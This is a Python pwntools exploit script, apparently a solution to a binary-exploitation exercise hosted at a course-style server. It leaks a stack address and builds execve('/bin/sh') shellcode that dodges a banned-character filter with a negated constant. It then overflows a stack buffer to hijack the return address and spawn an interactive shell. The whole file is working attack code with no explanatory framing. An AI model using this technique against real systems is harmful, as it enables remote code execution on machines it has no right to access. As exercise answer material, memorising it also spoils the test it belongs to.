#!/usr/bin/env python3

# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

from pwn import *
import argparse

HOST = "6447.lol"
PORT = 6192

context.arch = "amd64"

# banned characters - abcdefghijklmonpqurtsABCD/binshh
# custom_alphabet = b'EFGHIJKLMONPQURTSVWXYZ'

offset_from_rbp = 272

def exploit(p):
    reply = p.recvlines(3)
    stack_ptr = re.search('0x(.{12})', str(reply[2])).group(0)
    address = int(stack_ptr, 16)
    log.info("Buffer address: %s | %s" % (stack_ptr, p64(address)))

    asm_hex = "0x" + ''.join(reversed([hex(ord(x))[2:] for x in "/bin/sh"]))
    negative_hex = hex((int(asm_hex, 16) ^ 0xFFFFFFFFFFFFFFFF) + 1)  # Two's complement

    shellcode = asm(
        "xor rsi, rsi\n"            
        "xor rdx, rdx\n"           
        f"mov rax, {negative_hex}\n"
        "neg rax\n"     
        "push rax\n"                
        "mov rdi, rsp\n"            
        "mov rax, 59\n"             
        "syscall\n"
    )

    payload = fit({(offset_from_rbp - len(shellcode)): shellcode, (offset_from_rbp + 8): p64(address)}, filler='\x90', length=(offset_from_rbp + 16))
    log.info('payload : %s', payload)
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        exploit(remote(HOST, PORT))
    else:
        exploit(process(f"{__file__.replace('_sol.py', '')}"))
